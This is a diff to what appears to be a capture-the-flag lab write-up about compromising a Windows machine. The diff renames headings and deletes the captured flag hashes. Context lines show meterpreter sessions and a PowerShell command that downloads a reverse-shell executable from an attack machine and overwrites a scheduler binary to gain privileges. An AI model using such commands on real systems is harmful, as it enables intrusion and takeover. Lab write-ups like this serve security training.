@@ -6,9 +6,7 @@
 
 SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate privileges to root.
 
-## Brute-force login with Hydra
-
-### Scanning
+## Scanning
 
 First run a simple port scan (without Ping)
 
@@ -77,7 +75,7 @@ servicescan:
 
 There is a web server running on port 80/tcp.
 
-### Exploring
+## Exploring
 
 A short exploration of the site gave me a username and a login page. 
 
@@ -88,7 +86,7 @@ A short exploration of the site gave me a username and a login page.
 A [reverse image search](https://www.reverseimagesearch.com/) gave the name of the clown.
 The source code of the main page reveals an `Administrator` user `admin`. But we already knew that.
 
-### Brute-force admin
+## Brute-force admin
 
 Identify what type of request the form is making to the webserver by going to the login page.
 
@@ -449,14 +447,13 @@ In the existing reverse shell terminal, download the new reverse shell and repla
 
     powershell -c "Invoke-WebRequest -Uri 'http://IP address attack machine:8080/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
 
-### User flag
+## User flag
 
 ```text
 meterpreter > getuid 
 Server username: HACKPARK\Administrator
 meterpreter > cd c:\users\jeff\desktop\
 meterpreter > cat user.txt 
-759bd8af507517bcfaede78a21a73e39
 ```
 
 ### Root flag
@@ -464,7 +461,6 @@ meterpreter > cat user.txt
 ```text
 meterpreter > cd C:\users\administrator\desktop
 meterpreter > cat root.txt
-7e13d97f05f7ceb9881a3eb3d78d3e72
 ```
 
 ## Privilege escalation without Metasploit 
